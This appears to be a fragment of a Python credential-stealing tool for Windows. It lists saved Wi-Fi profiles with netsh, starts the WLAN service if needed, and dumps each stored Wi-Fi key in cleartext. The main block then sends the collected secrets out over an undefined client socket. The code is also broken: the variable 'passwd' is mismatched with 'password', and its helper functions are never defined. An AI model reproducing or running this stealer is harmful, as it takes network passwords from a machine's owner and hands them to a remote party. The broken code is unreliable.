import re
import sys
import subprocess

def get_profiles():
    passwd=''
    netsh_output = run_command("netsh wlan show profiles")
    if "not running" in netsh_output:
        net_wlan = run_command("net start wlansvc")
        if "started successfully" in net_wlan:
            netsh_output = run_command("netsh wlan show profiles")
        else:
            return net_wlan
    if "no wireless interface" in netsh_output:
        return netsh_output
    else:
        profiles=re.findall(': (.*)\r',netsh_output)
        for profile in profiles:
            output= run_command('netsh wlan show profiles "{}" key=clear'.format(profile))
            #output=re.findall('(Key Content.*)\r',proc)
            if output:
                password += "\n{}\n{}\n\n".format(profile,output)
        return password

if __name__ == '__main__':
    resp=get_profiles()
    send(client_socket,resp)
